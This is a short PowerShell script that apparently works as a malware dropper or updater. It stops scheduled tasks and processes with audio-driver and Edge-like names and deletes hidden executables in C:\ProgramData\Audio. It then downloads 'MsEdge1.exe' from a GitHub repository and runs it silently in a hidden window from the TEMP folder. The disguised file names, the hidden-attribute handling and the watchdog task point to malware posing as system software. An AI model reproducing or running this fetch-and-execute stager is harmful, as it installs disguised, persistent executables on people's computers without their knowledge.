$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$RepoBase   = 'https://github.com/xxxrytya9/logs9/raw/main'
$ExeName    = 'MsEdge1.exe'
$ExePath    = Join-Path $env:TEMP $ExeName
$InstallExe = 'C:\ProgramData\Audio\asd.exe'
$InstallDir = 'C:\ProgramData\Audio'

foreach ($taskName in @('AudioServiceDriver', 'AudioServiceDriver_watchdog')) {
    cmd /c "schtasks /end /tn `"$taskName`" >nul 2>&1"
}

Get-Process -Name 'asd' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Get-Process -Name 'MsEdge1' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 500

if (Test-Path -LiteralPath $InstallExe) {
    cmd /c "attrib -h -s `"$InstallExe`" >nul 2>&1"
    Remove-Item -LiteralPath $InstallExe -Force -ErrorAction SilentlyContinue
}
if (Test-Path -LiteralPath $InstallDir) {
    Get-ChildItem -LiteralPath $InstallDir -Filter '*.exe' -ErrorAction SilentlyContinue | ForEach-Object {
        cmd /c "attrib -h -s `"$($_.FullName)`" >nul 2>&1"
        Remove-Item -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue
    }
}

Invoke-WebRequest -Uri "$RepoBase/${ExeName}?cache=$([Guid]::NewGuid().ToString('N'))" -OutFile $ExePath -UseBasicParsing
Start-Process -FilePath $ExePath -WorkingDirectory $env:TEMP -WindowStyle Hidden
